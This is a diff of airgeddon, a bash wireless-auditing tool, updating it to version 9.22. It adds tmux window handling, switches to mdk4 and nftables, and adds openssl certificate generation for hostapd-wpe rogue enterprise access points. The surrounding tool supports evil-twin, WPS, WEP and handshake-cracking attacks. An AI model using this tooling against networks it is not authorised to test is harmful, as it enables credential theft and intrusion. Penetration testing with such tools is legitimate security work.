@@ -2,10 +2,14 @@
 #Title........: airgeddon.sh
 #Description..: This is a multi-use bash script for Linux systems to audit wireless networks.
 #Author.......: v1s1t0r
-#Date.........: 20190131
-#Version......: 9.01
+#Date.........: 20190908
+#Version......: 9.22
 #Usage........: bash airgeddon.sh
 #Bash Version.: 4.2 or later
+
+#Global shellcheck disabled warnings
+#shellcheck disable=SC2154
+#shellcheck disable=SC2034
 
 #Language vars
 #Change this line to select another default language. Select one from available values in array
@@ -35,17 +39,18 @@ essential_tools_names=(
 						"aircrack-ng"
 						"xterm"
 						"ip"
+						"lspci"
 					)
 
 optional_tools_names=(
 						"wpaclean"
 						"crunch"
 						"aireplay-ng"
-						"mdk3"
+						"mdk4"
 						"hashcat"
 						"hostapd"
 						"dhcpd"
-						"iptables"
+						"nft"
 						"ettercap"
 						"etterlog"
 						"sslstrip"
@@ -55,13 +60,13 @@ optional_tools_names=(
 						"reaver"
 						"bully"
 						"pixiewps"
-						"unbuffer"
 						"bettercap"
 						"beef"
 						"packetforge-ng"
 						"hostapd-wpe"
 						"asleap"
 						"john"
+						"openssl"
 					)
 
 update_tools=("curl")
@@ -76,14 +81,15 @@ declare -A possible_package_names=(
 									[${essential_tools_names[6]}]="aircrack-ng" #aircrack-ng
 									[${essential_tools_names[7]}]="xterm" #xterm
 									[${essential_tools_names[8]}]="iproute2" #ip
+									[${essential_tools_names[9]}]="pciutils" #lspci
 									[${optional_tools_names[0]}]="aircrack-ng" #wpaclean
 									[${optional_tools_names[1]}]="crunch" #crunch
 									[${optional_tools_names[2]}]="aircrack-ng" #aireplay-ng
-									[${optional_tools_names[3]}]="mdk3" #mdk3
+									[${optional_tools_names[3]}]="mdk4" #mdk4
 									[${optional_tools_names[4]}]="hashcat" #hashcat
 									[${optional_tools_names[5]}]="hostapd" #hostapd
 									[${optional_tools_names[6]}]="isc-dhcp-server / dhcp-server / dhcp" #dhcpd
-									[${optional_tools_names[7]}]="iptables" #iptables
+									[${optional_tools_names[7]}]="nftables" #nft
 									[${optional_tools_names[8]}]="ettercap / ettercap-text-only / ettercap-graphical" #ettercap
 									[${optional_tools_names[9]}]="ettercap / ettercap-text-only / ettercap-graphical" #etterlog
 									[${optional_tools_names[10]}]="sslstrip" #sslstrip
@@ -93,13 +99,13 @@ declare -A possible_package_names=(
 									[${optional_tools_names[14]}]="reaver" #reaver
 									[${optional_tools_names[15]}]="bully" #bully
 									[${optional_tools_names[16]}]="pixiewps" #pixiewps
-									[${optional_tools_names[17]}]="expect / expect-dev" #unbuffer
-									[${optional_tools_names[18]}]="bettercap" #bettercap
-									[${optional_tools_names[19]}]="beef-xss / beef-project" #beef
-									[${optional_tools_names[20]}]="aircrack-ng" #packetforge-ng
-									[${optional_tools_names[21]}]="hostapd-wpe" #hostapd-wpe
-									[${optional_tools_names[22]}]="asleap" #asleap
-									[${optional_tools_names[23]}]="john" #john
+									[${optional_tools_names[17]}]="bettercap" #bettercap
+									[${optional_tools_names[18]}]="beef-xss / beef-project" #beef
+									[${optional_tools_names[19]}]="aircrack-ng" #packetforge-ng
+									[${optional_tools_names[20]}]="hostapd-wpe" #hostapd-wpe
+									[${optional_tools_names[21]}]="asleap" #asleap
+									[${optional_tools_names[22]}]="john" #john
+									[${optional_tools_names[23]}]="openssl" #openssl
 									[${update_tools[0]}]="curl" #curl
 								)
 
@@ -109,8 +115,8 @@ declare -A possible_alias_names=(
 								)
 
 #General vars
-airgeddon_version="9.01"
-language_strings_expected_version="9.01-1"
+airgeddon_version="9.22"
+language_strings_expected_version="9.22-1"
 standardhandshake_filename="handshake-01.cap"
 timeout_capture_handshake="20"
 tmpdir="/tmp/"
@@ -122,7 +128,8 @@ pending_of_translation="[PoT]"
 escaped_pending_of_translation="\[PoT\]"
 standard_resolution="1024x768"
 curl_404_error="404: Not Found"
-rc_file=".airgeddonrc"
+rc_file_name=".airgeddonrc"
+alternative_rc_file_name="airgeddonrc"
 language_strings_file="language_strings.sh"
 broadcast_mac="FF:FF:FF:FF:FF:FF"
 
@@ -164,11 +171,12 @@ wep_key_handler="ag.wep_key_handler.sh"
 wep_processes_file="wep_processes"
 
 #Docker vars
-docker_based_distro="Kali"
+docker_based_distro="Parrot"
 docker_io_dir="/io"
 
 #WPS vars
 minimum_reaver_pixiewps_version="1.5.2"
+minimum_reaver_nullpin_version="1.6.1"
 minimum_bully_pixiewps_version="1.1"
 minimum_bully_verbosity4_version="1.1"
 minimum_wash_json_version="1.6.2"
@@ -191,6 +199,7 @@ urlscript_directlink="https://raw.githubusercontent.com/${github_user}/${github_
 urlscript_pins_dbfile="https://raw.githubusercontent.com/${github_user}/${github_repository}/${branch}/${known_pins_dbfile}"
 urlscript_pins_dbfile_checksum="https://raw.githubusercontent.com/${github_user}/${github_repository}/${branch}/${pins_dbfile_checksum}"
 urlscript_language_strings_file="https://raw.githubusercontent.com/${github_user}/${github_repository}/${branch}/${language_strings_file}"
+urlscript_options_config_file="https://raw.githubusercontent.com/${github_user}/${github_repository}/${branch}/${rc_file_name}"
 urlgithub_wiki="https://${repository_hostname}/${github_user}/${github_repository}/wiki"
 mail="v1s1t0r.1s.h3r3@gmail.com"
 author="v1s1t0r"
@@ -208,6 +217,14 @@ alt_range_start="172.16.250.33"
 alt_range_stop="172.16.250.100"
 std_c_mask="255.255.255.0"
 ip_mask="255.255.255.255"
+std_c_mask_cidr="24"
+ip_mask_cidr="32"
+any_mask_cidr="0"
+any_ip="0.0.0.0"
+any_ipv6="::/0"
+loopback_ip="127.0.0.1"
+loopback_ipv6="::1/128"
+routing_tmp_file="ag.iptables_nftables"
 dhcpd_file="ag.dhcpd.conf"
 internet_dns1="8.8.8.8"
 internet_dns2="8.8.4.4"
@@ -222,11 +239,13 @@ sslstrip_file="ag.sslstrip.log"
 ettercap_file="ag.ettercap.log"
 bettercap_file="ag.bettercap.log"
 beef_port="3000"
-beef_control_panel_url="http://127.0.0.1:${beef_port}/ui/panel"
+beef_control_panel_url="http://${loopback_ip}:${beef_port}/ui/panel"
 jshookfile="hook.js"
 beef_file="ag.beef.conf"
 beef_pass="airgeddon"
 beef_db="beef.db"
+beef_default_cfg_file="config.yaml"
+beef_needed_brackets_version="0.4.7.2"
 beef_installation_url="https://github.com/beefproject/beef/wiki/Installation"
 hostapd_file="ag.hostapd.conf"
 hostapd_wpe_file="ag.hostapd_wpe.conf"
@@ -234,6 +253,10 @@ hostapd_wpe_log="ag.hostapd_wpe.log"
 control_et_file="ag.et_control.sh"
 control_enterprise_file="ag.enterprise_control.sh"
 enterprisedir="enterprise/"
+certsdir="certs/"
+certspass="airgeddon"
+default_certs_path="/etc/hostapd-wpe/certs/"
+default_certs_pass="whatever"
 webserver_file="ag.lighttpd.conf"
 webdir="www/"
 indexfile="index.htm"
@@ -258,6 +281,7 @@ possible_beef_known_locations=(
 									"/usr/share/beef-xss/"
 									"/opt/beef/"
 									"/opt/beef-project/"
+									"/usr/lib/beef/"
 									#Custom BeEF location (set=0)
 								)
 
@@ -286,6 +310,7 @@ known_compatible_distros=(
 							"Red Hat"
 							"Arch"
 							"OpenMandriva"
+							"Pentoo"
 						)
 
 known_arm_compatible_distros=(
@@ -295,22 +320,22 @@ known_arm_compatible_distros=(
 							)
 
 #Hint vars
-declare main_hints=(128 134 163 437 438 442 445 516 590)
+declare main_hints=(128 134 163 437 438 442 445 516 590 626)
 declare dos_hints=(129 131 133)
 declare handshake_hints=(127 130 132 136)
-declare handshake_attack_hints=(142)
+declare handshake_dos_hints=(142)
 declare decrypt_hints=(171 179 208 244 163)
 declare personal_decrypt_hints=(171 178 179 208 244 163)
 declare enterprise_decrypt_hints=(171 179 208 244 163 610)
 declare select_interface_hints=(246)
 declare language_hints=(250 438)
-declare option_hints=(445 250 448 477 591)
+declare option_hints=(445 250 448 477 591 626)
 declare evil_twin_hints=(254 258 264 269 309 328 400 509)
 declare evil_twin_dos_hints=(267 268 509)
 declare beef_hints=(408)
-declare wps_hints=(342 343 344 356 369 390 490)
+declare wps_hints=(342 343 344 356 369 390 490 625)
 declare wep_hints=(431 429 428 432 433)
-declare enterprise_hints=(112 332 483 518)
+declare enterprise_hints=(112 332 483 518 629 301)
 
 #Charset vars
 crunch_lowercasecharset="abcdefghijklmnopqrstuvwxyz"
@@ -318,6 +343,11 @@ crunch_uppercasecharset="ABCDEFGHIJKLMNOPQRSTUVWXYZ"
 crunch_numbercharset="0123456789"
 crunch_symbolcharset="!#$%/=?{}[]-*:;"
 hashcat_charsets=("?l" "?u" "?d" "?s")
+
+#Tmux vars
+session_name="airgeddon"
+tmux_main_window="airgeddon-Main"
+no_hardcore_exit=0
 
 #Check coherence between script and language_strings file
 function check_language_strings() {
@@ -530,17 +560,17 @@ function option_toggle() {
 	local option_var_value="${!1}"
 
 	if "${option_var_value:-true}"; then
-		sed -ri "s:(${option_var_name})=(true):\1=false:" "${scriptfolder}${rc_file}" 2> /dev/null
-		if ! grep "${option_var_name}=false" "${scriptfolder}${rc_file}" > /dev/null; then
+		sed -ri "s:(${option_var_name})=(true):\1=false:" "${rc_path}" 2> /dev/null
+		if ! grep "${option_var_name}=false" "${rc_path}" > /dev/null; then
 			return 1
 		fi
-		export ${option_var_name}=false
+		eval "export ${option_var_name}=false"
 	else
-		sed -ri "s:(${option_var_name})=(false):\1=true:" "${scriptfolder}${rc_file}" 2> /dev/null
-		if ! grep "${option_var_name}=true" "${scriptfolder}${rc_file}" > /dev/null; then
+		sed -ri "s:(${option_var_name})=(false):\1=true:" "${rc_path}" 2> /dev/null
+		if ! grep "${option_var_name}=true" "${rc_path}" > /dev/null; then
 			return 1
 		fi
-		export ${option_var_name}=true
+		eval "export ${option_var_name}=true"
 	fi
 
 	case "${option_var_name}" in
@@ -967,6 +997,7 @@ function calculate_computepin_algorithm_step2() {
 }
 
 #Calculate pin based on Stefan Viehböck algorithm (EasyBox)
+#shellcheck disable=SC2207
 function calculate_easybox_algorithm() {
 
 	debug_print
@@ -1169,10 +1200,10 @@ function search_in_pin_database() {
 	for item in "${!PINDB[@]}"; do
 		if [ "${item}" = "${six_wpsbssid_first_digits_clean}" ]; then
 			bssid_found_in_db=1
-			arrpins=(${PINDB[${item//[[:space:]]/ }]})
+			arrpins=("${PINDB[${item//[[:space:]]/ }]}")
 			for item2 in "${arrpins[@]}"; do
 				counter_pins_found=$((counter_pins_found + 1))
-				pins_found+=(${item2})
+				pins_found+=("${item2}")
 				fill_wps_data_array "${wps_bssid}" "Database" "${item2}"
 			done
 			break
@@ -1198,16 +1229,16 @@ function check_interface_supported_bands() {
 	get_5ghz_band_info_from_phy_interface "${1}"
 	case "$?" in
 		"0")
-			interfaces_band_info["${2}","5Ghz_allowed"]=1
-			interfaces_band_info["${2}","text"]="${band_24ghz}, ${band_5ghz}"
+			interfaces_band_info["${2},5Ghz_allowed"]=1
+			interfaces_band_info["${2},text"]="${band_24ghz}, ${band_5ghz}"
 		;;
 		"1")
-			interfaces_band_info["${2}","5Ghz_allowed"]=0
-			interfaces_band_info["${2}","text"]="${band_24ghz}"
+			interfaces_band_info["${2},5Ghz_allowed"]=0
+			interfaces_band_info["${2},text"]="${band_24ghz}"
 		;;
 		"2")
-			interfaces_band_info["${2}","5Ghz_allowed"]=0
-			interfaces_band_info["${2}","text"]="${band_24ghz}, ${band_5ghz} (${red_color}${disabled_text[${language}]}${pink_color})"
+			interfaces_band_info["${2},5Ghz_allowed"]=0
+			interfaces_band_info["${2},text"]="${band_24ghz}, ${band_5ghz} (${red_color}${disabled_text[${language}]}${pink_color})"
 		;;
 	esac
 }
@@ -1589,6 +1620,16 @@ function option_menu() {
 	else
 		language_strings "${language}" 593
 	fi
+	if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "xterm" ]; then
+		language_strings "${language}" 616
+	else
+		language_strings "${language}" 617
+	fi
+	if [ "${AIRGEDDON_MDK_VERSION}" = "mdk3" ]; then
+		language_strings "${language}" 638
+	else
+		language_strings "${language}" 637
+	fi
 	language_strings "${language}" 447
 	print_hint ${current_menu}
 
@@ -1829,6 +1870,26 @@ function option_menu() {
 			fi
 		;;
 		10)
+			if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "xterm" ]; then
+				sed -ri "s:(AIRGEDDON_WINDOWS_HANDLING)=(xterm):\1=tmux:" "${rc_path}" 2> /dev/null
+			else
+				sed -ri "s:(AIRGEDDON_WINDOWS_HANDLING)=(tmux):\1=xterm:" "${rc_path}" 2> /dev/null
+			fi
+			echo
+			language_strings "${language}" 620 "yellow"
+			language_strings "${language}" 115 "read"
+		;;
+		11)
+			ask_yesno 639 "yes"
+			if [ "${yesno}" = "y" ]; then
+				mdk_version_toggle
+
+				echo
+				language_strings "${language}" 640 "yellow"
+				language_strings "${language}" 115 "read"
+			fi
+		;;
+		12)
 			ask_yesno 478 "yes"
 			if [ "${yesno}" = "y" ]; then
 				get_current_permanent_language
@@ -2029,16 +2090,12 @@ function set_chipset() {
 		elif [[ "${bus_type}" =~ pci|ssb|bcma|pcmcia ]]; then
 			if [[ -f /sys/class/net/${1}/device/vendor ]] && [[ -f /sys/class/net/${1}/device/device ]]; then
 				vendor_and_device=$(cat "/sys/class/net/${1}/device/vendor"):$(cat "/sys/class/net/${1}/device/device")
-				if hash lspci 2> /dev/null; then
-					chipset=$(lspci -d "${vendor_and_device}" | head -n 1 | cut -f 3 -d ":" | sed -e "${sedruleall}")
-				fi
+				chipset=$(lspci -d "${vendor_and_device}" | head -n 1 | cut -f 3 -d ":" | sed -e "${sedruleall}")
 			else
 				if hash ethtool 2> /dev/null; then
 					ethtool_output=$(ethtool -i "${1}" 2>&1)
 					vendor_and_device=$(printf "%s" "${ethtool_output}" | grep "bus-info" | cut -f 3 -d ":" | sed 's/^ //')
-					if hash lspci 2> /dev/null; then
-						chipset=$(lspci | grep "${vendor_and_device}" | head -n 1 | cut -f 3 -d ":" | sed -e "${sedruleall}")
-					fi
+					chipset=$(lspci | grep "${vendor_and_device}" | head -n 1 | cut -f 3 -d ":" | sed -e "${sedruleall}")
 				fi
 			fi
 		fi
@@ -2660,6 +2717,339 @@ function handshake_capture_check() {
 	done
 
 	kill "${processidcapture}" &> /dev/null
+	if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
+		tmux kill-window -t "${session_name}:Capturing Handshake"
+	fi
+}
+
+#Generate the needed config files for certificates creation
+#shellcheck disable=SC2016
+function create_certificates_config_files() {
+
+	debug_print
+
+	tmpfiles_toclean=1
+	rm -rf "${tmpdir}${certsdir}" > /dev/null 2>&1
+	mkdir "${tmpdir}${certsdir}" > /dev/null 2>&1
+
+	{
+	echo -e "[ ca ]"
+	echo -e "default_ca = CA_default\n"
+	echo -e "[ CA_default ]"
+	echo -e "dir = ${tmpdir}${certsdir::-1}"
+	echo -e 'certs = $dir'
+	echo -e 'crl_dir = $dir/crl'
+	echo -e 'database = $dir/index.txt'
+	echo -e 'new_certs_dir = $dir'
+	echo -e 'certificate = $dir/server.pem'
+	echo -e 'serial = $dir/serial'
+	echo -e 'crl = $dir/crl.pem'
+	echo -e 'private_key = $dir/server.key'
+	echo -e 'RANDFILE = $dir/.rand'
+	echo -e "name_opt = ca_default"
+	echo -e "cert_opt = ca_default"
+	echo -e "default_days = 3650"
+	echo -e "default_crl_days = 30"
+	echo -e "default_md = md5"
+	echo -e "preserve = no"
+	echo -e "policy = policy_match\n"
+	echo -e "[ policy_match ]"
+	echo -e "countryName = match"
+	echo -e "stateOrProvinceName = match"
+	echo -e "organizationName = match"
+	echo -e "organizationalUnitName = optional"
+	echo -e "commonName = supplied"
+	echo -e "emailAddress = optional\n"
+	echo -e "[ policy_anything ]"
+	echo -e "countryName = optional"
+	echo -e "stateOrProvinceName = optional"
+	echo -e "localityName = optional"
+	echo -e "organizationName = optional"
+	echo -e "organizationalUnitName = optional"
+	echo -e "commonName = supplied"
+	echo -e "emailAddress = optional\n"
+	echo -e "[ req ]"
+	echo -e "prompt = no"
+	echo -e "distinguished_name = server"
+	echo -e "default_bits = 2048"
+	echo -e "input_password = ${certspass}"
+	echo -e "output_password = ${certspass}\n"
+	echo -e "[server]"
+	echo -e "countryName = ${custom_certificates_country}"
+	echo -e "stateOrProvinceName = ${custom_certificates_state}"
+	echo -e "localityName = ${custom_certificates_locale}"
+	echo -e "organizationName = ${custom_certificates_organization}"
+	echo -e "emailAddress = ${custom_certificates_email}"
+	echo -e "commonName = \"${custom_certificates_cn}\""
+	} >> "${tmpdir}${certsdir}server.cnf"
+
+	{
+	echo -e "[ ca ]"
+	echo -e "default_ca = CA_default\n"
+	echo -e "[ CA_default ]"
+	echo -e "dir = ${tmpdir}${certsdir::-1}"
+	echo -e 'certs = $dir'
+	echo -e 'crl_dir = $dir/crl'
+	echo -e 'database = $dir/index.txt'
+	echo -e 'new_certs_dir = $dir'
+	echo -e 'certificate = $dir/ca.pem'
+	echo -e 'serial = $dir/serial'
+	echo -e 'crl = $dir/crl.pem'
+	echo -e 'private_key = $dir/ca.key'
+	echo -e 'RANDFILE = $dir/.rand'
+	echo -e "name_opt = ca_default"
+	echo -e "cert_opt = ca_default"
+	echo -e "default_days = 3650"
+	echo -e "default_crl_days = 30"
+	echo -e "default_md = md5"
+	echo -e "preserve = no"
+	echo -e "policy = policy_match\n"
+	echo -e "[ policy_match ]"
+	echo -e "countryName = match"
+	echo -e "stateOrProvinceName = match"
+	echo -e "organizationName= match"
+	echo -e "organizationalUnitName = optional"
+	echo -e "commonName = supplied"
+	echo -e "emailAddress = optional\n"
+	echo -e "[ policy_anything ]"
+	echo -e "countryName = optional"
+	echo -e "stateOrProvinceName = optional"
+	echo -e "localityName = optional"
+	echo -e "organizationName = optional"
+	echo -e "organizationalUnitName = optional"
+	echo -e "commonName = supplied"
+	echo -e "emailAddress = optional\n"
+	echo -e "[ req ]"
+	echo -e "prompt = no"
+	echo -e "distinguished_name = certificate_authority"
+	echo -e "default_bits = 2048"
+	echo -e "input_password = ${certspass}"
+	echo -e "output_password = ${certspass}"
+	echo -e "x509_extensions = v3_ca\n"
+	echo -e "[certificate_authority]"
+	echo -e "countryName = ${custom_certificates_country}"
+	echo -e "stateOrProvinceName = ${custom_certificates_state}"
+	echo -e "localityName = ${custom_certificates_locale}"
+	echo -e "organizationName = ${custom_certificates_organization}"
+	echo -e "emailAddress = ${custom_certificates_email}"
+	echo -e "commonName = \"${custom_certificates_cn}\"\n"
+	echo -e "[v3_ca]"
+	echo -e "subjectKeyIdentifier = hash"
+	echo -e "authorityKeyIdentifier = keyid:always,issuer:always"
+	echo -e "basicConstraints = CA:true"
+	} >> "${tmpdir}${certsdir}ca.cnf"
+
+	{
+	echo -e "[ xpclient_ext ]"
+	echo -e "extendedKeyUsage = 1.3.6.1.5.5.7.3.2\n"
+	echo -e "[ xpserver_ext ]"
+	echo -e "extendedKeyUsage = 1.3.6.1.5.5.7.3.1"
+	} >> "${tmpdir}${certsdir}xpextensions"
+}
+
+#Manage the questions to decide if custom certificates are used
+function custom_certificates_integration() {
+
+	debug_print
+
+	ask_yesno 645 "no"
+	if [ "${yesno}" = "y" ]; then
+		if [ -n "${enterprisecerts_completepath}" ]; then
+			ask_yesno 646 "yes"
+			if [ "${yesno}" = "y" ]; then
+				read_certspath=0
+			else
+				read_certspath=1
+			fi
+		else
+			read_certspath=1
+		fi
+		use_custom_certs=1
+	else
+		use_custom_certs=0
+	fi
+
+	echo
+	if [ "${use_custom_certs}" -eq 1 ]; then
+		if [ "${read_certspath}" -eq 0 ]; then
+			hostapd_wpe_cert_path="${enterprisecerts_completepath}"
+			hostapd_wpe_cert_pass="${certspass}"
+			language_strings "${language}" 648 "yellow"
+		else
+			language_strings "${language}" 327 "green"
+			echo -en '> '
+			read -re hostapd_wpe_cert_path
+			hostapd_wpe_cert_path=$(fix_autocomplete_chars "${hostapd_wpe_cert_path}")
+
+			lastcharhostapd_wpe_cert_path=${hostapd_wpe_cert_path: -1}
+			if [ "${lastcharhostapd_wpe_cert_path}" != "/" ]; then
+				hostapd_wpe_cert_path="${hostapd_wpe_cert_path}/"
+			fi
+
+			firstcharhostapd_wpe_cert_path=${hostapd_wpe_cert_path:: 1}
+			if [ "${firstcharhostapd_wpe_cert_path}" != "/" ]; then
+				hostapd_wpe_cert_path="${scriptfolder}${hostapd_wpe_cert_path}"
+			fi
+
+			echo
+			language_strings "${language}" 329 "green"
+			read -rp "> " hostapd_wpe_cert_pass
+		fi
+	else
+		hostapd_wpe_cert_path="${default_certs_path}"
+		hostapd_wpe_cert_pass="${default_certs_pass}"
+		language_strings "${language}" 647 "yellow"
+	fi
+
+	echo
+	language_strings "${language}" 649 "blue"
+	echo
+
+	local certsresult
+	certsresult=$(validate_certificates "${hostapd_wpe_cert_path}" "${hostapd_wpe_cert_pass}")
+	if [ "${certsresult}" = "0" ]; then
+		language_strings "${language}" 650 "yellow"
+		language_strings "${language}" 115 "read"
+		return 0
+	elif [ "${certsresult}" = "1" ]; then
+		language_strings "${language}" 237 "red"
+		language_strings "${language}" 115 "read"
+		return 1
+	elif [ "${certsresult}" = "2" ]; then
+		language_strings "${language}" 326 "red"
+		language_strings "${language}" 115 "read"
+		return 1
+	else
+		language_strings "${language}" 330 "red"
+		language_strings "${language}" 115 "read"
+		return 1
+	fi
+}
+
+#Validate if certificates files are correct
+function validate_certificates() {
+
+	debug_print
+	local certsresult
+	certsresult=0
+
+	if ! [ -f "${1}server.pem" ] || ! [ -r "${1}server.pem" ] || ! [ -f "${1}ca.pem" ] || ! [ -r "${1}ca.pem" ] || ! [ -f "${1}server.key" ] || ! [ -r "${1}server.key" ]; then
+		certsresult=1
+	else
+		if ! openssl x509 -in "${1}server.pem" -inform "PEM" -checkend "0" &> "/dev/null" || ! openssl x509 -in "${1}ca.pem" -inform "PEM" -checkend "0" &> "/dev/null"; then
+			certsresult=2
+		elif ! openssl rsa -in "${1}server.key" -passin "pass:${2}" -check &> "/dev/null"; then
+			certsresult=3
+		fi
+	fi
+
+	echo "${certsresult}"
+}
+
+#Create custom certificates
+function create_custom_certificates() {
+
+	debug_print
+
+	echo
+	language_strings "${language}" 642 "blue"
+
+	openssl dhparam -out "${tmpdir}${certsdir}dh" 1024 > /dev/null 2>&1
+	openssl req -new -out "${tmpdir}${certsdir}server.csr" -keyout "${tmpdir}${certsdir}server.key" -config "${tmpdir}${certsdir}server.cnf" > /dev/null 2>&1
+	openssl req -new -x509 -keyout "${tmpdir}${certsdir}ca.key" -out "${tmpdir}${certsdir}ca.pem" -days 3650 -config "${tmpdir}${certsdir}ca.cnf" > /dev/null 2>&1
+	touch "${tmpdir}${certsdir}index.txt" > /dev/null 2>&1
+	echo '01' > "${tmpdir}${certsdir}serial" 2> /dev/null
+	openssl ca -batch -keyfile "${tmpdir}${certsdir}ca.key" -cert "${tmpdir}${certsdir}ca.pem" -in "${tmpdir}${certsdir}server.csr" -key "${certspass}" -out "${tmpdir}${certsdir}server.crt" -extensions xpserver_ext -extfile "${tmpdir}${certsdir}xpextensions" -config "${tmpdir}${certsdir}server.cnf" > /dev/null 2>&1
+	openssl pkcs12 -export -in "${tmpdir}${certsdir}server.crt" -inkey "${tmpdir}${certsdir}server.key" -out "${tmpdir}${certsdir}server.p12" -passin pass:${certspass} -passout pass:${certspass} > /dev/null 2>&1
+	openssl pkcs12 -in "${tmpdir}${certsdir}server.p12" -out "${tmpdir}${certsdir}server.pem" -passin pass:${certspass} -passout pass:${certspass} > /dev/null 2>&1
+
+	manage_enterprise_certs
+	save_enterprise_certs
+}
+
+#Set up custom certificates
+function custom_certificates_questions() {
+
+	debug_print
+
+	custom_certificates_country=""
+	custom_certificates_state=""
+	custom_certificates_locale=""
+	custom_certificates_organization=""
+	custom_certificates_email=""
+	custom_certificates_cn=""
+
+	local email_length_regex
+	local email_spetial_chars_regex
+	local email_domain_regex
+	local regexp
+
+	regexp="^[A-Za-z]{2}$"
+	while [[ ! ${custom_certificates_country} =~ ${regexp} ]]; do
+		read_certificates_data "country"
+	done
+
+	while [[ -z "${custom_certificates_state}" ]]; do
+		read_certificates_data "state"
+	done
+
+	while [[ -z "${custom_certificates_locale}" ]]; do
+		read_certificates_data "locale"
+	done
+
+	while [[ -z "${custom_certificates_organization}" ]]; do
+		read_certificates_data "organization"
+	done
+
+	email_length_regex='.*{7,320}'
+	email_spetial_chars_regex='\!\#\$\%\&\*\+\/\=\?\^\_\`\{\|\}\~\-'
+	email_domain_regex='([[:alpha:]]([[:alnum:]\-]*[[:alnum:]])?)\.([[:alpha:]]([[:alnum:]\-]*[[:alnum:]])?\.)*[[:alpha:]]([[:alnum:]\-]*[[:alnum:]])?'
+	regexp="^[[:alnum:]${email_spetial_chars_regex}]+(\.[[:alnum:]${email_spetial_chars_regex}]+)*[[:alnum:]${email_spetial_chars_regex}]*\@${email_domain_regex}$"
+	while [[ ! ${custom_certificates_email} =~ ${regexp} ]] || [[ ! ${custom_certificates_email} =~ ${email_length_regex} ]]; do
+		read_certificates_data "email"
+	done
+
+	regexp="^(\*|[[:alpha:]]([[:alnum:]\-]{0,61}[[:alnum:]])?)\.([[:alpha:]]([[:alnum:]\-]{0,61}[[:alnum:]])?\.)*[[:alpha:]]([[:alnum:]\-]{0,61}[[:alnum:]])?$"
+	while [[ ! ${custom_certificates_cn} =~ ${regexp} ]]; do
+		read_certificates_data "cn"
+	done
+}
+
+#Read the user input on custom certificates questions
+function read_certificates_data() {
+
+	debug_print
+
+	echo
+	case "${1}" in
+		"country")
+			language_strings "${language}" 630 "green"
+			read -rp "> " custom_certificates_country
+			custom_certificates_country="${custom_certificates_country^^}"
+		;;
+		"state")
+			language_strings "${language}" 631 "green"
+			read -rp "> " custom_certificates_state
+		;;
+		"locale")
+			language_strings "${language}" 632 "green"
+			read -rp "> " custom_certificates_locale
+		;;
+		"organization")
+			language_strings "${language}" 633 "green"
+			read -rp "> " custom_certificates_organization
+		;;
+		"email")
+			language_strings "${language}" 634 "green"
+			read -rp "> " custom_certificates_email
+			custom_certificates_email="${custom_certificates_email,,}"
+		;;
+		"cn")
+			language_strings "${language}" 635 "green"
+			read -rp "> " custom_certificates_cn
+			custom_certificates_cn="${custom_certificates_cn,,}"
+		;;
+	esac
 }
 
 #Validate if selected network has the needed type of encryption
@@ -2732,6 +3122,9 @@ function kill_wep_windows() {
 	for item in "${WEP_PROCESSES_TO_KILL[@]}"; do
 		kill "${item}" &> /dev/null
 	done
+	if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
+		kill_tmux_windows
+	fi
 }
 
 #Prepare wep attack deleting temp files
@@ -2756,6 +3149,63 @@ function set_wep_key_script() {
 
 	cat >&8 <<-EOF
 		#!/usr/bin/env bash
+		AIRGEDDON_WINDOWS_HANDLING="${AIRGEDDON_WINDOWS_HANDLING}"
+	EOF
+
+	cat >&8 <<-EOF
+
+		function manage_output() {
+
+			xterm_parameters="\${1}"
+			tmux_command_line="\${2}"
+			xterm_command_line="\"\${2}\""
+			window_name="\${3}"
+			command_tail=" > /dev/null 2>&1 &"
+
+			case "\${AIRGEDDON_WINDOWS_HANDLING}" in
+				"tmux")
+					local tmux_color
+					tmux_color=""
+					[[ "\${1}" =~ -fg[[:blank:]](\")?(#[0-9a-fA-F]+) ]] && tmux_color="\${BASH_REMATCH[2]}"
+					case "\${4}" in
+						"active")
+							start_tmux_processes "\${window_name}" "clear;\${tmux_command_line}" "\${tmux_color}" "active"
+						;;
+						*)
+							start_tmux_processes "\${window_name}" "clear;\${tmux_command_line}" "\${tmux_color}"
+						;;
+					esac
+				;;
+				"xterm")
+					eval "xterm \${xterm_parameters} -e \${xterm_command_line}\${command_tail}"
+				;;
+			esac
+		}
+		function start_tmux_processes() {
+
+			window_name="\${1}"
+			command_line="\${2}"
+			tmux kill-window -t "${session_name}:\${window_name}" 2> /dev/null
+			case "\${4}" in
+				"active")
+					tmux new-window -t "${session_name}:" -n "\${window_name}"
+				;;
+				*)
+					tmux new-window -d -t "${session_name}:" -n "\${window_name}"
+				;;
+			esac
+			local tmux_color_cmd
+			if [ -n "\${3}" ]; then
+				tmux_color_cmd="bg=#000000 fg=\${3}"
+			else
+				tmux_color_cmd="bg=#000000"
+			fi
+			tmux setw -t "\${window_name}" window-style "\${tmux_color_cmd}"
+			tmux send-keys -t "${session_name}:\${window_name}" "\${command_line}" ENTER
+		}
+	EOF
+
+	cat >&8 <<-EOF
 		wep_key_found=0
 
 		#Check if the wep password was captured and manage to save it on a file
@@ -2828,6 +3278,29 @@ function set_wep_key_script() {
 		}
 	EOF
 
+	if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
+		cat >&8 <<-EOF
+			function kill_tmux_windows() {
+
+				local TMUX_WINDOWS_LIST=()
+				local current_window_name
+				readarray -t TMUX_WINDOWS_LIST < <(tmux list-windows -t "${session_name}:")
+				for item in "\${TMUX_WINDOWS_LIST[@]}"; do
+					[[ "\${item}" =~ ^[0-9]+:[[:blank:]](.+([^*-]))([[:blank:]]|\-|\*)[[:blank:]]?\([0-9].+ ]] && current_window_name="\${BASH_REMATCH[1]}"
+					if [ "\${current_window_name}" = "${tmux_main_window}" ]; then
+						continue
+					fi
+					if [ -n "\${1}" ]; then
+						if [ "\${current_window_name}" = "\${1}" ]; then
+							continue
+						fi
+					fi
+					tmux kill-window -t "${session_name}:\${current_window_name}"
+				done
+			}
+		EOF
+	fi
+
 	cat >&8 <<-EOF
 		while true; do
 			sleep 1
@@ -2851,6 +3324,15 @@ function set_wep_key_script() {
 
 	cat >&8 <<-EOF
 		kill_wep_script_windows
+	EOF
+
+	if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
+		cat >&8 <<-EOF
+			kill_tmux_windows "WEP Key Decrypted"
+		EOF
+	fi
+
